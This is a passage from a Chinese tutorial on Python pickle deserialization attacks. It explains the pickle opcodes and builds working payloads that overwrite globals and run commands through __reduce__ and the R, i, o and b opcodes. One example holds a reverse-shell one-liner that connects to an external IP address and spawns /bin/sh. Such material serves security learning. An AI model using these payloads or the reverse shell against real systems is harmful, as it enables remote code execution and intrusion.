&#39;__main__.tttang&#39;</code>赋值给<code>inst</code>,如果<code>inst</code>中存在<code>setstate</code>，就用<code>setstate</code>来处理<code>state</code>，否则就存入<code>inst_dict</code>中</p>\n<p>第二十四步<br>读取<code>.</code>，结束反序列化</p>\n<p>大家在自行阅读源码过后也可以通过<code>pickletools</code>来查看自己的大体思路是否出错<br>这个模块调用也比较简单，如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import pickle\nimport pickletools\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tttang</span><span class=\"token punctuation\">:</span>\n    def <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword return-type\">self</span><span class=\"token operator\">.</span>name<span class=\"token operator\">=</span>name\n        <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>age<span class=\"token operator\">=</span>age\na<span class=\"token operator\">=</span>pickle<span class=\"token operator\">.</span><span class=\"token function\">dumps</span><span class=\"token punctuation\">(</span><span class=\"token function\">tttang</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"19\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\npickletools<span class=\"token operator\">.</span><span class=\"token function\">dis</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果如下图<br><img src=\"https://img-blog.csdnimg.cn/bdc223c0e6174312b16cd6ae05b2b576.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>Pickle之所以出现反序列化漏洞的原因，是因为pickle数据是完全可控的，我们可以用来表示任意对象，官方也声明了其危险性。<br><img src=\"https://img-blog.csdnimg.cn/1ce18553dd034f1c9875ed093c1a541b.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><h3 id=\"全局变量覆盖\"><a href=\"#全局变量覆盖\" class=\"headerlink\" title=\"全局变量覆盖\"></a>全局变量覆盖</h3><p>举个例子<br>现在存在一个文件<code>secret.py</code>，内容如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">key<span class=\"token operator\">=</span><span class=\"token string\">'flag&#123;xxx&#125;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果我们能把它修改成<code>tttang</code>，就算是解题成功。那我们该怎么实现呢<br>方法的话其实是很简单的，我们只需要通过<code>c</code>操作符得到全局变量<code>secret</code>，然后利用<code>b</code>操作符修改属性值即可，构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">c__main__\nsecret\n<span class=\"token punctuation\">(</span>S<span class=\"token string\">'key'</span>\nS<span class=\"token string\">'tttang'</span>\ndb<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>测试代码如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> secret\n\npayload<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''c__main__\nsecret\n(S'key'\nS'tttang'\ndb.'''</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'before:'</span><span class=\"token punctuation\">,</span>secret<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span>\n\noutput<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output:'</span><span class=\"token punctuation\">,</span>output<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'after:'</span><span class=\"token punctuation\">,</span>secret<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://img-blog.csdnimg.cn/bc3c6b8d67104a8589a3100bcab461bd.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"函数执行\"><a href=\"#函数执行\" class=\"headerlink\" title=\"函数执行\"></a>函数执行</h3><h4 id=\"—reduce—方法\"><a href=\"#—reduce—方法\" class=\"headerlink\" title=\"—reduce—方法\"></a>—reduce—方法</h4><p>常见的利用方式是什么呢，我们这里就需要提到一个方法了,这个方法就是<code>__reduce__</code>方法，简单介绍一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">__reduce__\n调用<span class=\"token punctuation\">:</span>被定义之后，当对象被pickle时就会触发\n作用<span class=\"token punctuation\">:</span>如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle\n\t如果接收到的是元组，这个元组应该包含<span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token number\">6</span>个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里给出一个简单的demo</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#encoding: utf-8</span>\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">tttang</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'whoami'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\na<span class=\"token operator\">=</span>tttang<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\npickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/a6db9e170bfc49d8a698d82d38c50173.png\" alt=\"在这里插入图片描述\"><br>可以看到成功执行了命令<br>这个不仅可以实现函数利用，也可以实现反弹shell，如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> os\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">tttang</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        a<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"\n        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.222.255.142\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\na <span class=\"token operator\">=</span> tttang<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/c38d1f3689f44ef1946594e5a566c967.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"编写opcode实现函数执行\"><a href=\"#编写opcode实现函数执行\" class=\"headerlink\" title=\"编写opcode实现函数执行\"></a>编写opcode实现函数执行</h4><p>函数执行，这就要提到<code>opcode</code>,也就是那序列化后的那些字符，它们都有一定的含义，我们也可以通过编写opcode实现函数执行，<br>具体的大家可以看这里<br><a href=\"https://github.com/python/cpython/blob/main/Lib/pickle.py#L111\">https://github.com/python/cpython/blob/main/Lib/pickle.py#L111</a><br><code>hachp1 </code>大师傅总结了一下常用的opcode及其功能，如下所示(参考自<a href=\"https://xz.aliyun.com/t/7436#toc-0\">https://xz.aliyun.com/t/7436</a>)</p>\n<table>\n<thead><tr>\n<th>opcode</th>\n<th>描述</th>\n<th>具体写法</th>\n<th>栈上的变化</th>\n<th>memo上的变化</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>c</td>\n<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>\n<td>c[module]\\n[instance]\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>o</td>\n<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>\n<td>o</td>\n<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>i</td>\n<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>\n<td>i[module]\\n[callable]\\n</td>\n<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>N</td>\n<td>实例化一个None</td>\n<td>N</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>S</td>\n<td>实例化一个字符串对象</td>\n<td>S'xxx'\\n（也可以使用双引号、\\'等python字符串形式）</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>V</td>\n<td>实例化一个UNICODE字符串对象</td>\n<td>Vxxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>I</td>\n<td>实例化一个int对象</td>\n<td>Ixxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>F</td>\n<td>实例化一个float对象</td>\n<td>Fx.x\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>R</td>\n<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>\n<td>R</td>\n<td>函数和参数出栈，函数的返回值入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>.</td>\n<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>\n<td>.</td>\n<td>无</td>\n<td>无</td>\n</tr>\n<tr>\n<td>(</td>\n<td>向栈中压入一个MARK标记</td>\n<td>(</td>\n<td>MARK标记入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>t</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>\n<td>t</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>)</td>\n<td>向栈中直接压入一个空元组</td>\n<td>)</td>\n<td>空元组入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>l</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>\n<td>l</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>]</td>\n<td>向栈中直接压入一个空列表</td>\n<td>]</td>\n<td>空列表入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>d</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>\n<td>d</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>}</td>\n<td>向栈中直接压入一个空字典</td>\n<td>}</td>\n<td>空字典入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>p</td>\n<td>将栈顶对象储存至memo_n</td>\n<td>pn\\n</td>\n<td>无</td>\n<td>对象被储存</td>\n</tr>\n<tr>\n<td>g</td>\n<td>将memo_n的对象压栈</td>\n<td>gn\\n</td>\n<td>对象被压栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>0</td>\n<td>丢弃栈顶对象</td>\n<td>0</td>\n<td>栈顶对象被丢弃</td>\n<td>无</td>\n</tr>\n<tr>\n<td>b</td>\n<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>\n<td>b</td>\n<td>栈上第一个元素出栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>s</td>\n<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>\n<td>s</td>\n<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>u</td>\n<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>\n<td>u</td>\n<td>MARK标记以及被组合的数据出栈，字典被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>a</td>\n<td>将栈的第一个元素append到第二个元素(列表)中</td>\n<td>a</td>\n<td>栈顶元素出栈，第二个元素（列表）被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>e</td>\n<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>\n<td>e</td>\n<td>MARK标记以及被组合的数据出栈，列表被更新</td>\n<td>无</td>\n</tr>\n</tbody>\n</table>\n\n<p>看过这个之后，就大致了解了每个<code>opcode</code>的作用，现在来说一下函数执行<br>函数执行常用的有以下几个操作符</p>\n<h5 id=\"R操作符\"><a href=\"#R操作符\" class=\"headerlink\" title=\"R操作符\"></a>R操作符</h5><p><code>R</code>操作符，其对应的函数如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">load_reduce</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    stack <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>stack\n    args <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    func <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    stack<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> func<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单分析一下<br>弹出栈作为函数执行的参数，因此这里的参数需要是元组形式，然后取栈中最后一个元素作为函数，并将指向结果赋值给此元素<br>因此这里的话，我们想执行的命令<code>whoami</code>放入栈中，再把<code>system</code>模块放入栈中，即可实现函数的函数执行<br>构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a<span class=\"token operator\">=</span><span class=\"token string\">b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解读一下，<br>字符<code>c</code>读取module<code>os</code>，读取name<code>system</code>,此时就构造出了<code>os.system</code><br>字符<code>X</code>，往后读取四位<code>\\x06\\x00\\x00\\x00whoami</code><br>字符<code>\\x85</code>，它将最后一个数据变成元组重新入栈<br>字符<code>.</code>，结束了反序列化</p>\n<p>测试代码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\na<span class=\"token operator\">=</span><span class=\"token string\">b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.'</span>\nflag<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/df5a0969caf1411f878069b4f0a03237.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"i操作符\"><a href=\"#i操作符\" class=\"headerlink\" title=\"i操作符\"></a>i操作符</h5><p><code>i</code>操作符，其对应函数如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">load_inst</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n       module <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"ascii\"</span><span class=\"token punctuation\">)</span>\n       name <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"ascii\"</span><span class=\"token punctuation\">)</span>\n       klass <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>find_class<span class=\"token punctuation\">(</span>module<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span>\n       self<span class=\"token punctuation\">.</span>_instantiate<span class=\"token punctuation\">(</span>klass<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>pop_mark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>分析函数<br>向下依次读取两行分别作为<code>module</code>和<code>name</code>，然后利用<code>find_class</code>寻找对应方法，通过<code>pop_mark()</code>函数得到参数，利用<code>_instantiate</code>函数执行，将结果存入栈中，<code>pop_mark()</code>对应代码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">pop_mark</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    items <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>stack\n    self<span class=\"token punctuation\">.</span>stack <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>metastack<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    self<span class=\"token punctuation\">.</span>append <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>stack<span class=\"token punctuation\">.</span>append\n    <span class=\"token keyword\">return</span> items<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单分析一下，这里是获取当前栈赋给<code>items</code>，然后弹出栈内元素，再把这个栈赋值给当前栈，然后返回<code>items</code><br>构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token string\">b'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解读一下<br>字符<code>(</code>，为了与后面的字符<code>i</code>作对应，<code>i</code>字符寻找上一个<code>MARK</code>来闭合，然后组合其内的数据作为元组，以此元组作为函数参数<br>字符<code>X</code>，向后读取四个字符串<code>\\x06\\x00\\x00\\x00whoami</code>而后压入栈中<br>字符<code>i</code>，往后读取两行得到<code>os.system</code>，调用参数并执行<br>字符<code>.</code>，结束反序列化</p>\n<p>测试代码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\na<span class=\"token operator\">=</span><span class=\"token string\">b'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.'</span>\nb<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/d2aefdc8bc3b43999981ef1cd8168e0c.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"o操作符\"><a href=\"#o操作符\" class=\"headerlink\" title=\"o操作符\"></a>o操作符</h5><p><code>o</code>操作符，其对应函数如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">load_obj</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># Stack is ... markobject classobject arg1 arg2 ...</span>\n    args <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>pop_mark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cls <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    self<span class=\"token punctuation\">.</span>_instantiate<span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单分析一下，这个函数先弹出栈中一个元素作为<code>args</code>，也就是参数，而后再弹出第一个元素作为函数，调用<code>_instantiate</code>函数自执行</p>\n<p>构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token string\">b'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解读一下<br>字符<code>(</code>，为了和之后的字符<code>o</code>对应，实现闭合，获取函数及参数<br>字符<code>c</code>，往后读取两行，得到函数<code>os.system</code><br>字符<code>X</code>,往后读取四位得到<code>x06\\x00\\x00\\x00whoami</code>，即<code>whoami</code><br>字符<code>o</code>，与<code>(</code>实现闭合，将第一个元素，也就是<code>os.system</code>作为函数，第二个元素<code>whoami</code>作为参数，执行<br>字符<code>.</code>，结束反序列化</p>\n<p>测试代码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\na<span class=\"token operator\">=</span><span class=\"token string\">b'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.'</span>\nb<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/2adbb5b7947a42338223c357386c1a8f.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"b操作符\"><a href=\"#b操作符\" class=\"headerlink\" title=\"b操作符\"></a>b操作符</h5><p><code>b</code>操作符，其对应函数如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">load_build</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    stack <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>stack\n    state <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    inst <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    setstate <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>inst<span class=\"token punctuation\">,</span> <span class=\"token string\">\"__setstate__\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> setstate <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        setstate<span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span>\n    slotstate <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">,</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        state<span class=\"token punctuation\">,</span> slotstate <span class=\"token operator\">=</span> state\n    <span class=\"token keyword\">if</span> state<span class=\"token punctuation\">:</span>\n        inst_dict <span class=\"token operator\">=</span> inst<span class=\"token punctuation\">.</span>__dict__\n        <span class=\"token builtin\">intern</span> <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span><span class=\"token builtin\">intern</span>\n        <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n                inst_dict<span class=\"token punctuation\">[</span><span class=\"token builtin\">intern</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                inst_dict<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v\n    <span class=\"token keyword\">if</span> slotstate<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> slotstate<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>inst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单分析一下，这个函数是当栈中存在<code>__setstate__</code>时，就会执行<code>setstate(state)</code>，因此我们这里自定义一个<code>__setstate__</code>类，分别构造<code>os.system</code>和<code>whoami</code>即可执行命令<br>构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token string\">b'c__main__\\ntttang\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.'</span><span 